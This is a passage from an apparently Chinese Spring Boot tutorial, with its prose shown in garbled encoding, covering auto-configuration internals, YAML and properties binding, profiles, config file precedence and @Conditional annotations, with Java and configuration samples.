autoConfigurationMetadata);\n            this.fireAutoConfigurationImportEvents(configurations, exclusions);\n            return (String[])configurations.toArray(new String[configurations.size()]);\n        } catch (IOException var6) {\n            throw new IllegalStateException(var6);\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nå¶ä¸­Configurationä¸­å°±åå«äºç»ä»¶çå¨ç±»åï¼ç±this.getCandidateConfigurations(annotationMetadata, attributes);æ¹æ³è·åï¼è¯¥æ¹æ³ä¸­è°ç¨äºSpringFactoriesLoader.loadFactoryNamesãä»éç½®æä»¶ä¸­è·åäºå¨ç±»åã\n\nEnumeration<URL> urls = classLoader != null ? classLoader.getResources("META-INF/spring.factories") : ClassLoader.getSystemResources("META-INF/spring.factories");\n\n\n1\n\n\nSpringbootå¨å¯å¨çæ¶åä»ç±»è·¯å¾ä¸çMETA-INF/spring.factoriesä¸­è·åEnableAutoConfigurationæå®çå¼ï¼å°è¿äºå¼ä½ä¸ºèªå¨éç½®ç±»å¯¼å¥å°å®¹å¨ä¸­ï¼èªå¨éç½®ç±»å°±çæï¼å¸®æä»¬è¿è¡èªå¨éç½®å·¥ä½ã\n\n\n# Springbootéç½®æä»¶\n\nspringbootä¸­æä¸¤ç§ç±»åçéç½®æä»¶ï¼application.propertiesåapplication.ymlã\n\néç½®æä»¶çä½ç¨ï¼Springbootå¨åºå±åå¥½äºç»ä»¶çåºæ¬éç½®ï¼å½æä»¬æ³è¦èªå®ä¹éç½®æ¶ï¼å°±éè¦å®ä¹éç½®æä»¶ã\n\n\n# YAMLè¯­æ³\n\n# åºæ¬è¯­æ³\n\nYAMLæ¯åºäºé®å¼å¯¹çè¯­æ³æ¨¡å¼ï¼ä½¿ç¨ç©ºæ ¼å®æå±çº§çç¼©è¿ï¼åªè¦æ¯å¯¹é½çç©ºæ ¼æ°ï¼å°±è®¤ä¸ºæ¯åä¸å±çº§çãYAMLç¸å¯¹äºXMLéç½®æä»¶ï¼æ´å å³æ³¨æ°æ®ãåºæ¬æ ·å¼å¦ä¸ï¼\n\nserver:\n  port: 8081\n\n\n1\n2\n\n\n# å¼è¯­æ³\n\nå­é¢éï¼k: vå­é¢éå¯ä»¥ç´æ¥åï¼å­ç¬¦ä¸²é»è®¤ä¸å åå¼å·æèåå¼å·ãåå¼å·ä¸ä¼è½¬ä¹å­ç¬¦ä¸²éé¢çç¹æ®å­ç¬¦ãèä½¿ç¨åå¼å·ä¼å¯¹ç¹æ®å­ç¬¦è¿è¡è½¬ä¹ã\n\nå¯¹è±¡ãMapï¼\n\n# å¯¹è±¡ãmapçåæ³\nfriends:\n\tlastName: zhangsan\n\tage: 20\n\t\n# å¯¹è±¡ãmapçè¡ååæ³\nfriends: {lastName: zhangsan,age: 18}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\næ°ç»ï¼\n\n# æ°ç»çåæ³\npets:\n - cat\n - dog\n - pig\n# æ°ç»çè¡ååæ³\npets: [cat,dog,pig]\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# éç½®æä»¶å¼å¯¼å¥JavaBean\n\njavaBean\n\npackage com.pwddd.springboot.bean;\n\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.boot.context.properties.ConfigurationProperties;\nimport org.springframework.stereotype.Component;\n\nimport java.util.List;\nimport java.util.Map;\n\n@ConfigurationProperties(prefix = "person")\n@Component\npublic class Person {\n\n    private String name;\n    private Integer age;\n    private boolean boss;\n    private Map<String,String> maps;\n    private List<String> lists;\n    private Dog dog;\n\n    @Override\n    public String toString() {\n        return "Person{" +\n                "name=\'" + name + \'\\\'\' +\n                ", age=" + age +\n                ", boss=" + boss +\n                ", maps=" + maps +\n                ", lists=" + lists +\n                ", dog=" + dog +\n                \'}\';\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public Integer getAge() {\n        return age;\n    }\n\n    public void setAge(Integer age) {\n        this.age = age;\n    }\n\n    public boolean isBoss() {\n        return boss;\n    }\n\n    public void setBoss(boolean boss) {\n        this.boss = boss;\n    }\n\n    public Map<String, String> getMaps() {\n        return maps;\n    }\n\n    public void setMaps(Map<String, String> maps) {\n        this.maps = maps;\n    }\n\n    public List<String> getLists() {\n        return lists;\n    }\n\n    public void setLists(List<String> lists) {\n        this.lists = lists;\n    }\n\n    public Dog getDog() {\n        return dog;\n    }\n\n    public void setDog(Dog dog) {\n        this.dog = dog;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n\n\npackage com.pwddd.bean;\n\npublic class Dog {\n    private String name;\n    private Integer age;\n\n    @Override\n    public String toString() {\n        return "Dog{" +\n                "name=\'" + name + \'\\\'\' +\n                ", age=" + age +\n                \'}\';\n    }\n\n    public Dog() {\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public Integer getAge() {\n        return age;\n    }\n\n    public void setAge(Integer age) {\n        this.age = age;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\næ·»å éç½®å¤çå¨ï¼ç¨æ¥æç¤ºéç½®æä»¶\n\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-configuration-processor</artifactId>\n    <optional>true</optional>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\nç¼åéç½®æä»¶\n\nperson:\n  name: zhangsan\n  age: 12\n  maps: {zhangsan: aaa,lisi: bbb}\n  lists:\n    - zhangsan\n    - lisi\n  dog:\n    name: zhangsan\n    age: 12\n\t\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nç¼åæµè¯\n\n@SpringBootTest\nclass SpringbootApplicationTests {\n\n    @Autowired\n    Person person;\n\n    @Test\n    public void testProperties(){\n        System.out.println(person);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# å¶ä»è·åå¼çæ¹æ³\n\n//@ConfigurationProperties(prefix = "person")\n@Component\npublic class Person {\n\n    private String name;\n    @Value("${person.age}")\n    private Integer age;\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nConfigurationPropertiesåValueçåºå«ï¼\n\n             @CONFIGURATIONPROPERTIES   @VALUE\nåè½           æ¹éæ³¨å¥éç½®æä»¶ä¸­çå±æ§               ä¸ä¸ªä¸ªæå®\næ¾æ£ç»å®ï¼æ¾æ£è¯­æ³ï¼   æ¯æ                         ä¸æ¯æ\nSpEL         ä¸æ¯æ                        æ¯æ\nJSR303æ°æ®æ ¡éª   æ¯æ                         ä¸æ¯æ\nå¤æç±»åå°è£       æ¯æ                         ä¸æ¯æ\n\nå¦æè¯´ï¼æä»¬åªæ¯å¨æä¸ªä¸å¡é»è¾ä¸­éè¦è·åä¸ä¸éç½®æä»¶ä¸­çæé¡¹å¼ï¼ä½¿ç¨@Valueãå¦æè¯´ï¼æä»¬ä¸é¨ç¼åäºä¸ä¸ªjavaBeanæ¥åéç½®æä»¶è¿è¡æ å°ï¼æä»¬å°±ç´æ¥ä½¿ç¨@ConfigurationPropertiesã\n\n\n# éç½®æä»¶æ³¨å¥å¼æ°æ®æ ¡éª\n\n@Component\n@ConfigurationProperties(prefix = "person")\n@Validated\npublic class Person {\n/**\n* <bean class="Person">\n* <property name="lastName" value="å­é¢é/${key}ä»ç¯å¢åéãéç½®æä»¶ä¸­è·åå¼/#\n{SpEL}"></property>\n* <bean/>\n*/\n//lastNameå¿é¡»æ¯é®ç®±æ ¼å¼\n@Email\n//@Value("${person.lastâname}")\nprivate String lastName;\n//@Value("#{11*2}")\nprivate Integer age;\n//@Value("true")\nprivate Boolean boss;\nprivate Date birth;\nprivate Map<String,Object> maps;\nprivate List<Object> lists;\nprivate Dog dog;\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# @PropertieSource\n\n@PropertieSource:å è½½æå®çéç½®æä»¶ãé»è®¤ä»å¨å±éç½®æä»¶ä¸­å è½½éç½®ï¼å¦æéè¦æå®å¶ä»çéç½®æä»¶çä½ç½®ï¼å°±å¯ä»¥ä½¿ç¨è¯¥æ³¨è§£ã\n\n@ImportResourceï¼å¯¼å¥Springçéç½®æä»¶ï¼è®©éç½®æä»¶éé¢çåå®¹çæãSpringBootéé¢æ²¡æSpringçéç½®æä»¶ï¼æä»¬èªå·±ç¼åçéç½®æä»¶ï¼ä¹ä¸è½èªå¨è¯å«ãæ³è®©Springçéç½®æä»¶çæï¼å è½½è¿æ¥ã\n\n@ImportResource(locations = {"classpath:beans.xml"})\n//å¯¼å¥Springçéç½®æä»¶è®©å¶çæ\n\n\n1\n2\n\n\nSpringBootæ¨èç»å®¹å¨ä¸­æ·»å ç»ä»¶çæ¹å¼ï¼æ¨èä½¿ç¨å¨æ³¨è§£çæ¹å¼ã\n\n 1. éç½®ç±»æ·»å @Configurationæ³¨è§£ï¼ææå½åç±»æ¯ä¸ä¸ªéç½®ç±»ã\n\n 2. ä½¿ç¨@Beanç»å®¹å¨ä¸­æ·»å ç»ä»¶\n\npackage com.pwddd.springboot.config;\n\nimport org.springframework.context.annotation.Configuration;\n\n@Configuration\npublic class MyAppConfig {\n//å°æ¹æ³çè¿åå¼æ·»å å°å®¹å¨ä¸­ï¼å®¹å¨ä¸­è¿ä¸ªç»ä»¶é»è®¤çidå°±æ¯æ¹æ³å\n    \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# éç½®æä»¶å ä½ç¬¦\n\n# éæºæ°\n\n${random.value}ã${random.int}ã${random.long}\n${random.int(10)}ã${random.int[1024,65536]}\n\n\n1\n2\n\n\n# å ä½ç¬¦è·åéç½®å¼\n\nperson.lastâname=å¼ ä¸${random.uuid}\nperson.age=${random.int}\nperson.birth=2017/12/15\nperson.boss=false\nperson.maps.k1=v1\nperson.maps.k2=14\nperson.lists=a,b,c\nperson.dog.name=${person.hello:hello}_dog\nperson.dog.age=15\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# profileå¤ç¯å¢æ¯æ\n\næä»¬å¨ä¸»éç½®æä»¶ç¼åçæ¶åï¼æä»¶åå¯ä»¥æ¯ application-{profile}.properties/ymlã\n\né»è®¤ä½¿ç¨application.propertiesçéç½®ãå½æä»¬éè¦æ¿æ´»æå®çéç½®æä»¶æ¶ï¼å¯ä»¥å¨ä¸»éç½®æä»¶ä¸­æå®ï¼spring.profiles.active=devæèä½¿ç¨å½ä»¤è¡æ¹å¼java -jar spring-boot-02-config-0.0.1-SNAPSHOT.jar --spring.profiles.active=devï¼æèä½¿ç¨èææºæ¹å¼-Dspring.profiles.active=devã\n\n\n# ymlå¤ææ¡£åæ¨¡å¼\n\nserver:\n port: 8081\n spring:\n profiles:\n active: prod\nâââ\nserver:\n port: 8083\n spring:\n profiles: dev\nâââ\nserver:\n port: 8084\n spring:\n profiles: prod #æå®å±äºåªä¸ªç¯å¢\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# éç½®æä»¶çå è½½\n\nspringbootå¯å¨ä¼æ«æä»¥ä¸ä½ç½®çapplication.propertiesæèapplication.ymlæä»¶ä½ä¸ºSpringbootçé»è®¤éç½®æä»¶ã\n\nâfile:./config/  å½åé¡¹ç®çconfigç®å½\nâfile:./\nâclasspath:/config/\nâclasspath:/\n\n\n1\n2\n3\n4\n\n\nä¼åçº§ç±é«å°åºï¼é«ä¼åçº§çéç½®ä¼è¦çä½ä¼åçº§çéç½®ãåªè¦ä»¥ä¸çéç½®æä»¶å­å¨Springbootå°±ä¼å è½½ï¼å½¢æéç½®æä»¶çäºè¡¥ã\n\næä»¬è¿å¯ä»¥éè¿spring.config.locationæ¥æ¹åé»è®¤çéç½®æä»¶ä½ç½®(ä½¿ç¨å½ä»¤è¡åæ°çæ¹å¼)ï¼\n\njava -jar spring-boot-02-config-0.0.1-SNAPSHOT.jar --spring.profiles.active=dev --spring.config.location=xxx\n\n\n1\n\n\nè¿ä¸ªéç½®æä»¶çä½ç½®ä¼åå¶ä»ä½ç½®ä¸çéç½®æä»¶å±åå è½½ã\n\nSpringBootä¹å¯ä»¥ä»ä»¥ä¸ä½ç½®å è½½éç½®ï¼ä¼åçº§ä»é«å°ä½ï¼é«ä¼åçº§çéç½®è¦çä½ä¼åçº§çéç½®ï¼ææçéç½®ä¼ å½¢æäºè¡¥éç½®ã\n\n 1.  å½ä»¤è¡åæ°\n 2.  æ¥èªjava:comp/envçJNDIå±æ§\n 3.  Javaç³»ç»å±æ§ï¼System.getProperties()ï¼\n 4.  æä½ç³»ç»ç¯å¢åé\n 5.  RandomValuePropertySourceéç½®çrandom.*å±æ§å¼\n 6.  jaråå¤é¨çapplication-{profile}.propertiesæapplication.yml(å¸¦spring.profile)éç½®æä»¶\n 7.  jarååé¨çapplication-{profile}.propertiesæapplication.yml(å¸¦spring.profile)éç½®æä»¶\n 8.  jaråå¤é¨çapplication.propertiesæapplication.yml(ä¸å¸¦spring.profile)éç½®æä»¶\n 9.  jarååé¨çapplication.propertiesæapplication.yml(ä¸å¸¦spring.profile)éç½®æä»¶\n 10. @Configurationæ³¨è§£ç±»ä¸ç@PropertySource\n 11. éè¿SpringApplication.setDefaultPropertiesæå®çé»è®¤å±æ§\n\n\n# èªå¨éç½®åç\n\néç½®æä»¶è½å¤éç½®çå±æ§å¯ä»¥åèï¼Springbootéç½®æä»¶\n\n 1.  Springbootå¯å¨ç±»ä¸æä¸ä¸ªæ³¨è§£@SpringBootApplicationï¼è¯¥æ³¨è§£æ¯ä¸ä¸ªç»åæ³¨è§£\n     \n     @Target({ElementType.TYPE})\n     @Retention(RetentionPolicy.RUNTIME)\n     @Documented\n     @Inherited\n     @SpringBootConfiguration\n     @EnableAutoConfiguration\n     @ComponentScan(\n         excludeFilters = {@Filter(\n         type = FilterType.CUSTOM,\n         classes = {TypeExcludeFilter.class}\n     ), @Filter(\n         type = FilterType.CUSTOM,\n         classes = {AutoConfigurationExcludeFilter.class}\n     )}\n     )\n     public @interface SpringBootApplication {\n     \n     \n     1\n     2\n     3\n     4\n     5\n     6\n     7\n     8\n     9\n     10\n     11\n     12\n     13\n     14\n     15\n     16\n     \n\n 2.  å¶ä¸­æä¸ä¸ª@EnableAutoConfigurationï¼è¯¥æ³¨è§£å°±æ¯å®ç°èªå¨éç½®æå³çæ³¨è§£ã\n     \n     @Target({ElementType.TYPE})\n     @Retention(RetentionPolicy.RUNTIME)\n     @Documented\n     @Inherited\n     @AutoConfigurationPackage\n     @Import({AutoConfigurationImportSelector.class})\n     public @interface EnableAutoConfiguration {\n     \n     \n     1\n     2\n     3\n     4\n     5\n     6\n     7\n     \n\n 3.  å¶ä¸­@Importå¯¼å¥äºä¸ä¸ªèªå¨éç½®å¯¼å¥éæ©å¨ï¼å¨è¯¥éæ©å¨ä¸­ï¼æä¸ä¸ªæ¹æ³ï¼å°ææçèªå¨éç½®å¨ç±»åä¿å­å°ä¸ä¸ªconfigurationsä¸­ã\n     \n         protected AutoConfigurationImportSelector.AutoConfigurationEntry getAutoConfigurationEntry(AnnotationMetadata annotationMetadata) {\n             if (!this.isEnabled(annotationMetadata)) {\n                 return EMPTY_ENTRY;\n             } else {\n                 AnnotationAttributes attributes = this.getAttributes(annotationMetadata);\n                 List<String> configurations = this.getCandidateConfigurations(annotationMetadata, attributes);\n                 configurations = this.removeDuplicates(configurations);\n                 Set<String> exclusions = this.getExclusions(annotationMetadata, attributes);\n                 this.checkExcludedClasses(configurations, exclusions);\n                 configurations.removeAll(exclusions);\n                 configurations = this.getConfigurationClassFilter().filter(configurations);\n                 this.fireAutoConfigurationImportEvents(configurations, exclusions);\n                 return new AutoConfigurationImportSelector.AutoConfigurationEntry(configurations, exclusions);\n             }\n         }\n     \n     \n     1\n     2\n     3\n     4\n     5\n     6\n     7\n     8\n     9\n     10\n     11\n     12\n     13\n     14\n     15\n     \n\n 4.  è·åconfigurationçæ¹æ³æ¯getCandidateConfigurationsã\n     \n         protected List<String> getCandidateConfigurations(AnnotationMetadata metadata, AnnotationAttributes attributes) {\n             List<String> configurations = SpringFactoriesLoader.loadFactoryNames(this.getSpringFactoriesLoaderFactoryClass(), this.getBeanClassLoader());\n             Assert.notEmpty(configurations, "No auto configuration classes found in META-INF/spring.factories. If you are using a custom packaging, make sure that file is correct.");\n             return configurations;\n         }\n     \n     \n     1\n     2\n     3\n     4\n     5\n     \n\n 5.  è¯¥æ¹æ³ä¸­è°ç¨äºSpringFactoriesLoaderä¸­çloadFactoryNamesè·åå°äºææçéç½®æä»¶ä¸­éç½®çAuto Configurationå¨ç±»åã\n     \n     Enumeration urls = classLoader.getResources("META-INF/spring.factories");\n     \n     \n     1\n     \n\n 6.  è¯¥æ¹æ³æ«æææJaråä¸çMETA-INF/spring.factoriesï¼ææ«æå°çè¿äºæä»¶çåå®¹åè£æpropertieså¯¹è±¡ï¼ä»propertiesä¸­è·åå°EnableAutoConfiguration.classç±»(ç±»å)å¯¹åºçå¼ï¼ç¶åæä»ä»¬æ·»å å¨å®¹å¨ä¸­ã\n\n 7.  æ¯ä¸ä¸ªè¿æ ·çxxxAutoConfigurationç±»é½æ¯å®¹å¨ä¸­çä¸ä¸ªç»ä»¶ï¼é½å å¥å°å®¹å¨ä¸­ï¼ç¨ä»ä»¬æ¥åèªå¨éç½®ã\n\n 8.  ä»¥HttpEncodingAutoConfigurationï¼Httpç¼ç èªå¨éç½®ï¼ä¸ºä¾è§£éèªå¨éç½®åçã\n     \n     @Configuration(\n         proxyBeanMethods = false\n     )  // //è¡¨ç¤ºè¿æ¯ä¸ä¸ªéç½®ç±»ï¼ä»¥åç¼åçéç½®æä»¶ä¸æ ·ï¼ä¹å¯ä»¥ç»å®¹å¨ä¸­æ·»å ç»ä»¶\n     @EnableConfigurationProperties({ServerProperties.class})  ////å¯å¨æå®ç±»çConfigurationPropertiesåè½ï¼å°éç½®æä»¶ä¸­å¯¹åºçå¼åServerPropertiesç»å®èµ·æ¥ï¼å¹¶æServerPropertieså å¥å°iocå®¹å¨ä¸­\n     \n     @ConditionalOnWebApplication(\n         type = Type.SERVLET\n     )  // n //Springåºå±@Conditionalæ³¨è§£ï¼Springæ³¨è§£çï¼ï¼æ ¹æ®ä¸åçæ¡ä»¶ï¼å¦ææ»¡è¶³æå®çæ¡ä»¶ï¼æ´ä¸ªéç½®ç±»éé¢çéç½®å°±ä¼çæï¼ å¤æ­å½ååºç¨æ¯å¦æ¯webåºç¨ï¼å¦ææ¯ï¼å½åéç½®ç±»çæ\n     \n     @ConditionalOnClass({CharacterEncodingFilter.class})  //å¤æ­å½åé¡¹ç®ææ²¡æè¿ä¸ªç±», CharacterEncodingFilterï¼SpringMVCä¸­è¿è¡ä¹±ç è§£å³çè¿æ»¤å¨ï¼\n     \n     @ConditionalOnProperty(\n         prefix = "server.servlet.encoding",\n         value = {"enabled"},\n         matchIfMissing = true\n     ) // //å¤æ­éç½®æä»¶ä¸­æ¯å¦å­å¨æä¸ªéç½® server.servlet.encodingï¼å¦æä¸å­å¨ï¼å¤æ­ä¹æ¯æç«ç\n     //å³ä½¿æä»¬éç½®æä»¶ä¸­ä¸éç½®server.servlet.encoding=trueï¼ä¹æ¯é»è®¤çæçï¼\n     public class HttpEncodingAutoConfiguration {\n         \n         // åencodingåæ å°ï¼encodingç±»ä¸­éç½®å¯¹åºçç¸å³éç½®æä»¶çåå®¹ï¼å ä¸ä¸é¢çåç¼ã\n         private final Encoding properties;\n     \n         //åªæä¸ä¸ªæåæé å¨çæåµä¸ï¼åæ°çå¼å°±ä¼ä»å®¹å¨ä¸­æ¿\n         public HttpEncodingAutoConfiguration(ServerProperties properties) {\n             this.properties = properties.getServlet().getEncoding();\n         }\n     \n         @Bean  ////ç»å®¹å¨ä¸­æ·»å ä¸ä¸ªç»ä»¶ï¼è¿ä¸ªç»ä»¶çæäºå¼éè¦ä»propertiesä¸­è·å\n         @ConditionalOnMissingBean  //å¤æ­å®¹å¨æ²¡æè¿ä¸ªç»ä»¶ï¼\n         public CharacterEncodingFilter characterEncodingFilter() {\n             CharacterEncodingFilter filter = new OrderedCharacterEncodingFilter();\n             filter.setEncoding(this.properties.getCharset().name());\n             filter.setForceRequestEncoding(this.properties.shouldForce(org.springframework.boot.web.servlet.server.Encoding.Type.REQUEST));\n             filter.setForceResponseEncoding(this.properties.shouldForce(org.springframework.boot.web.servlet.server.Encoding.Type.RESPONSE));\n             return filter;\n         }\n     \n     \n     1\n     2\n     3\n     4\n     5\n     6\n     7\n     8\n     9\n     10\n     11\n     12\n     13\n     14\n     15\n     16\n     17\n     18\n     19\n     20\n     21\n     22\n     23\n     24\n     25\n     26\n     27\n     28\n     29\n     30\n     31\n     32\n     33\n     34\n     35\n     36\n     \n\n 9.  æ ¹æ®å½åä¸åçæ¡ä»¶å¤æ­ï¼å³å®è¿ä¸ªéç½®ç±»æ¯å¦çæãä¸ä½è¿ä¸ªéç½®ç±»çæï¼è¿ä¸ªéç½®ç±»å°±ä¼ç»å®¹å¨ä¸­æ·»å åç§ç»ä»¶ï¼è¿äºç»ä»¶çå±æ§æ¯ä»å¯¹åºçpropertiesç±»ä¸­è·åçï¼è¿äºç±»éé¢çæ¯ä¸ä¸ªå±æ§åæ¯åéç½®æä»¶ç»å®çã\n\n 10. ææå¨éç½®æä»¶ä¸­è½éç½®çå±æ§é½æ¯å¨xxxxPropertiesç±»ä¸­å°è£çï¼éç½®æä»¶è½éç½®ä»ä¹å°±å¯ä»¥åç§æä¸ªåè½å¯¹åºçè¿ä¸ªå±æ§ç±»ã\n     \n     public class Encoding {\n         public static final Charset DEFAULT_CHARSET;\n         private Charset charset;\n         private Boolean force;\n         private Boolean forceRequest;\n         private Boolean forceResponse;\n         private Map<Locale, Charset> mapping;\n     \n     \n     1\n     2\n     3\n     4\n     5\n     6\n     7\n     \n\n\n# Springbootçç²¾é«\n\n * SpringBootå¯å¨ä¼å è½½å¤§éçèªå¨éç½®ç±»\n * æä»¬çæä»¬éè¦çåè½ææ²¡æSpringBooté»è®¤åå¥½çèªå¨éç½®ç±»\n * æä»¬åæ¥çè¿ä¸ªèªå¨éç½®ç±»ä¸­å°åºéç½®äºåªäºç»ä»¶ï¼åªè¦æä»¬è¦ç¨çç»ä»¶æï¼æä»¬å°±ä¸éè¦åæ¥éç½®äºï¼\n * ç»å®¹å¨ä¸­èªå¨éç½®ç±»æ·»å ç»ä»¶çæ¶åï¼ä¼ä»propertiesç±»ä¸­è·åæäºå±æ§ãæä»¬å°±å¯ä»¥å¨éç½®æä»¶ä¸­æå®è¿äºå±æ§çå¼ã\n\n\n# @Conditionalæ´¾çæ³¨è§£\n\nä½ç¨ï¼å¯¹çææ¡ä»¶è¿è¡å¤æ­ï¼å¿é¡»æ¯@Conditionalæå®çæ¡ä»¶æç«ï¼æç»å®¹å¨ä¸­æ·»å ç»ä»¶ï¼éç½®ééé¢çææåå®¹æçæã\n\n@CONDITIONALæ©å±æ³¨è§£                  ä½ç¨ï¼å¤æ­æ¯å¦æ»¡è¶³å½åæå®æ¡ä»¶ï¼\n@ConditionalOnJava                ç³»ç»çjavaçæ¬æ¯å¦ç¬¦åè¦æ±\n@ConditionalOnBean                å®¹å¨ä¸­å­å¨æå®Bean\n@ConditionalOnMissingBean         å®¹å¨ä¸­ä¸å­å¨æå®Bean\n@ConditionalOnExpression          æ»¡è¶³SpELè¡¨è¾¾å¼æå®\n@ConditionalOnClass               ç³»ç»ä¸­ææå®çç±»\n@ConditionalOnMissingClass        ç³»ç»ä¸­æ²¡ææå®çç±»\n@ConditionalOnSingleCandidate     å®¹å¨ä¸­åªæä¸ä¸ªæå®çBeanï¼æèè¿ä¸ªBeanæ¯é¦éBean\n@ConditionalOnProperty            ç³»ç»ä¸­æå®çå±æ§æ¯å¦ææå®çå¼\n@ConditionalOnResource            ç±»è·¯å¾ä¸æ¯å¦å­å¨æå®èµæºæä»¶\n@ConditionalOnWebApplication      å½åæ¯webç¯å¢\n@ConditionalOnNotWebApplication   å½åä¸æ¯webç¯å¢\n@ConditionalOnJndi                JNDIå­å¨æå®é¡¹\n\nå æ­¤ï¼æä»¬èªå¨éç½®ç±»éè¦å¨è¯¥ç±»æ»¡è¶³éç½®ä»¥ä¸æ³¨è§£çæ¡ä»¶ä¸æè½ä½¿ç¨ï¼æä»¬å¯ä»¥å¨éç½®æä»¶ä¸­å¼å¯debugæ¨¡å¼ï¼è¯¥æ¨¡å¼å¯ä»¥æå°èªå¨éç½®æ¥åï¼å¨è¯¥æ¥åä¸­æ æäºåªäºç±»çæï¼åªäºç±»ä¸çæã\n\n\n============================\nCONDITIONS EVALUATION REPORT\n============================\n\n\nPositive matches:\n-----------------\n\n   AopAutoConfiguration matched:\n      - @ConditionalOnProperty (spring.aop.auto=true) matched (OnPropertyCondition)\n\n   AopAutoConfiguration.ClassProxyingConfiguration matched:\n      - @ConditionalOnMissingClass did not find unwanted class \'org.aspectj.weaver.Advice\' (OnClassCondition)\n      - @ConditionalOnProperty (spring.aop.proxy-target-class=true) matched (OnPropertyCondition)\n\n   DispatcherServletAutoConfiguration matched:\n      - @ConditionalOnClass found required class \'org.springframework.web.servlet.DispatcherServlet\' (OnClassCondition)\n      - found \'session\' scope (OnWebApplicationCondition)\n\n   DispatcherServletAutoConfiguration.DispatcherServletConfiguration matched:\n      - @ConditionalOnClass found required class \'javax.servlet.ServletRegistration\' (OnClassCondition)\n      - Default DispatcherServlet did not find dispatcher servlet beans (DispatcherServletAutoConfiguration.DefaultDispatcherServletCondition)\n\n   DispatcherServletAutoConfiguration.DispatcherServletRegistrationConfiguration matched:\n      - @ConditionalOnClass found required class \'javax.servlet.ServletRegistration\' (OnClassCondition)\n      - DispatcherServlet Registration did not find servlet registration bean (DispatcherServletAutoConfiguration.DispatcherServletRegistrationCondition)\n\nâ¦â¦â¦â¦â¦â¦â¦â¦\n\nNegative matches:\n-----------------\n\n   ActiveMQAutoConfiguration:\n      Did not match:\n         - @ConditionalOnClass did not find required class \'javax.jms.ConnectionFactory\' (OnClassCondition)\n\n   AopAutoConfiguration.AspectJAutoProxyingConfiguration:\n      Did not match:\n         - @ConditionalOnClass did not find required class \'org.aspectj.weaver.Advice\' (OnClassCondition)\n\n â¦â¦â¦â¦â¦â¦â¦\n\nExclusions:\n-----------\n\n    None\n\n\nUnconditional classes:\n----------------------\n\n    org.springframework.boot.autoconfigure.context.ConfigurationPropertiesAutoConfiguration\n\n    org.springframework.boot.autoconfigure.context.LifecycleAutoConfiguration\n\n    org.springframework.boot.autoconfigure.context.PropertyPlaceholderAutoConfiguration\n\n    org.springframework.boot.autoconfigure.availability.ApplicationAvailabilityAutoConfiguration\n\n    org.springframework.boot.autoconfigure.info.ProjectInfoAutoConfiguration\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\n\n# æ¥å¿\n\nåºæ¯ï¼å°å¼ å¨å¼åä¸ä¸ªå¤§åçç³»ç»ï¼å¨ç³»ç»ä¸­ä¸ºäºè°è¯æ¹ä¾¿ï¼å°å¼ ä½¿ç¨System.out.Printæå°äºä¸äºè°è¯ä¿¡æ¯ãæä¸å¤©ï¼é¢å¯¼è¯´æ³è¦å°æå°çä¿¡æ¯ç§»é¤æï¼è½ç¶å¾å°é¾ï¼å°å¼ è¿æ¯å°èªå·±åçSystem.outä¸è¡ä¸è¡çå æäºãå é¤ä¹åï¼é¢å¯¼è¯´å°å¼ åçè°è¯è¾åºè¿æ¯å¾æç¨çï¼æ³è¦éæ°å ä¸ï¼å¹¶ä¸æå¥½è½å¤è¾åºå°ä¸ä¸ªæä»¶ä¸­å»ãäºæ¯å°å¼ åäºä¸ä¸ªæ¥å¿çæ¡æ¶zhanglogging.jarï¼è°ç¨æ¡æ¶ä¸­çapiæå°æ¥å¿å¹¶ä¸è¾åºå°æä»¶ä¸­ãè¿äºä¸æ®µæ¶é´ï¼å°å¼ æ³ç»ä»çæ¡æ¶ä¸­æ·»å ä¸äºåè½ï¼äºæ¯åäºä¸ä¸ªzhanglogging-better.jarãé£ä¹æä¹æ¿æ¢é¡¹ç®ä¸­çæ¥å¿æ¡æ¶å¢ï¼è¿éè¦éæ°å°ä½¿ç¨è¿æ¥å¿çå°æ¹æ¿æ¢ä¸ºæ°çæ¥å¿æ¡æ¶ãå°å¼ æ³å°äºJDBCï¼JDBCæä¾äºä¸ä¸ªæ°æ®åºçè¿æ¥å¨ï¼åé¢çå®ç°ç¨çä¸åçå·ä½å®ç°çjarãäºæ¯å°å¼ 